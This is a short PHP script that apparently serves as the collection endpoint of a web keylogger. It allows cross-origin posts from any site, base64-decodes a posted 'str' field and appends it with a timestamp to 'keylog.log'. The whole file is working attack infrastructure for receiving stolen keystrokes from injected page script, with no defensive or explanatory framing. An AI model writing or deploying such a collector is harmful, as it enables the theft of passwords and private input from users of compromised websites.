<?php
	header('Access-Control-Allow-Origin: *');
	if (isset($_POST['str']) && strlen($_POST['str']) > 0) {
		file_put_contents("keylog.log", date('Y/m/d h:i:s')." | ".base64_decode($_POST['str']).PHP_EOL, FILE_APPEND);
	}
?>
